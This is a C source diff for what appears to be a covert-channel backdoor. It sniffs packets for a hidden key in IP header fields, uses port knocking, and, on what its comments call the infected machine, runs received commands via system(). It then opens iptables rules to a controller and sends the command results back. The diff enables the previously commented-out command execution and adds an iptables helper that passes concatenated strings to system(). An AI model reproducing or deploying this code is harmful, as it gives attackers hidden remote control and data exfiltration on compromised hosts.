@@ -19,8 +19,8 @@ int Packetcapture(char *filter, struct filter Filter){
         exit(0);
     }
 //the filter i create isnt working not sure why will fix later
-    //if(pcap_compile(interfaceinfo, &fp, filter, 0, netp) == -1){
-    if(pcap_compile(interfaceinfo, &fp, "tcp and (port 8506 || port 8507 || port 8505)", 0, netp) == -1){
+    if(pcap_compile(interfaceinfo, &fp, filter, 0, netp) == -1){
+    //if(pcap_compile(interfaceinfo, &fp, "tcp and (port 8506 || port 8507 || port 8505)", 0, netp) == -1){
         perror("pcap_comile");
     }
 
@@ -83,6 +83,7 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
         } else if(CheckKey(ip->ip_tos, ip->ip_id,true)) {
             //change to port knocking
             //ParsePattern(args,pkthdr, packet);
+            PortKnocking(*Filter, pkthdr, packet, false);
         } else {
             printf("Packet tossed wrong key\n");
         }
@@ -140,10 +141,34 @@ void ParseTCP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_c
 
     if(size_payload > 0){
         printf("Payload (%d bytes):\n", size_payload);
-        //ParsePayload(filter, payload, size_payload);
+        ParsePayload(Filter, payload, size_payload);
     }
 }
-/*
+
+void iptables(char *ip, char *protocol, char *port, bool input, bool remove){
+    char iptable[BUFFERSIZE];
+    memset(iptable, '\0', BUFFERSIZE);
+    if(remove){
+        strcat(iptable,"iptables -D ");
+    } else {
+        strcat(iptable,"iptables -I ");
+    }
+    if(input){
+        strcat(iptable," INPUT -p ");
+    } else {
+        strcat(iptable," OUTPUT -p ");
+    }
+    strcat(iptable, protocol);
+    strcat(iptable, " -s ");
+    strcat(iptable, ip);
+    strcat(iptable, " --dport ");
+    strcat(iptable,port);
+    strcat(iptable, " -j ACCEPT");
+    printf("Iptables: %s\n", iptable);
+    system(iptable);
+}
+
+
 void ParsePayload(struct filter *Filter, const u_char *payload, int len){
     FILE *fp;
     unsigned char decryptedtext[BUFSIZE+16];
@@ -164,45 +189,43 @@ void ParsePayload(struct filter *Filter, const u_char *payload, int len){
         perror("fwrite");
         exit(1);
     }
-    if(true){
     //if CNC
+    /*fclose(fp);
+    system(CHMOD);
+    system(CMD);
+    char ip[sizeof(Filter->targetip)];
+    strcpy(ip,Filter->targetip);
+    system(IPTABLES(ip,TCP,PORT));
+
+    //sending the results back to the CNC
+    char *srcip = Filter->localip;
+    char *destip = Filter->targetip;
+    unsigned short sport = Filter->port_ushort[0];
+    unsigned short dport = Filter->port_ushort[1];
+
+    send_results(srcip, destip, sport, dport, RESULT_FILE);
+    system(TURNOFF(Filter->targetip));*/
+    //infected machine
     fclose(fp);
     system(CHMOD);
     system(CMD);
-    system(IPTABLES(INFECTEDIP));
-
+    iptables(Filter->targetip, "tcp", PORT, false, false);
+    printf("COMMAND RECEIEVED \n");
     //sending the results back to the CNC
-    char *srcip = INFECTEDIP;
-    char *destip = CNCIP;
-    unsigned short sport = SHPORT;
-    unsigned short dport = SHPORT;
-
+    char *srcip = Filter->localip;
+    char *destip = Filter->targetip;
+    unsigned short sport = Filter->port_ushort[0];
+    unsigned short dport = Filter->port_ushort[1];
+    unsigned char data[BUFSIZE] = " ";
+    printf("PORT KNOCKING\n");
+    PortKnocking(*Filter, NULL, NULL, true);
+    printf("SENDING RESULTS\n");
     send_results(srcip, destip, sport, dport, RESULT_FILE);
-    system(TURNOFF(INFECTEDIP));
-    } else {
-        //infected machine
-        fclose(fp);
-        system(CHMOD);
-        system(CMD);
-        system(IPTABLES(CNCIP));
-
-        printf("COMMAND RECEIEVED \n");
-        //sending the results back to the CNC
-        char *srcip = INFECTEDIP;
-        char *destip = CNCIP;
-        unsigned short sport = SHPORT;
-        unsigned short dport = SHPORT;
-        unsigned char data[BUFSIZE] = "ls";
-        printf("PORT KNOCKING\n");
-        send_pattern(srcip, destip, sport, dport, data);
-        printf("RETURNING RESULTS\n");
-        send_results(srcip, destip, sport, dport, RESULT_FILE);
-        system(TURNOFF(CNCIP));
-        printf("\n");
-        printf("\n");
-        printf("Waiting for new command\n");
-    }
-}*/
+    iptables(Filter->targetip, "tcp", PORT, false, true);
+    printf("\n");
+    printf("\n");
+    printf("Waiting for new command\n");
+}
 
 
 struct filter InitFilter(char *target, char *local){
@@ -232,6 +255,7 @@ void PrintFilter(struct filter Filter){
 }
 
 void CreateFilter(struct filter Filter, char *buffer){
+    memset(buffer, '\0', BUFFERSIZE);
     strcat(buffer,"tcp and (");
     for(int i = 0; i < Filter.amount; ++i){
         strcat(buffer, "port ");
@@ -241,10 +265,11 @@ void CreateFilter(struct filter Filter, char *buffer){
             strncat(buffer, OR, sizeof(OR));
         }
     }
-    strcat(buffer, END);
+    strcat(buffer," || port 8505)");
 }
 
-void PortKnocking(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet, bool send, struct filter Filter){
+
+void PortKnocking(struct filter Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet, bool send){
     const struct sniff_tcp *tcp=0;
     const struct my_ip *ip;
     const char *payload;
@@ -285,16 +310,14 @@ void PortKnocking(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* 
         }
         //fix this part
         if((Filter.pattern[0] == 1) && (Filter.pattern[1] == 1)){
-            //system(IPTABLES(targetip,"tcp",PORT));
+            iptables(Filter.targetip, "tcp", PORT, true, false);
             char *dip = Filter.targetip;
             printf("WAITING FOR DATA\n");
             recv_results(dip, (short)PORT, RESULT_FILE);
-            //system(TURNOFF(INFECTEDIP));
+            iptables(Filter.targetip, "tcp", PORT, true, true);
             pcap_breakloop(interfaceinfo);
         }
     }
-
-
 }
 
 void SendPattern(unsigned char *data, struct filter Filter){
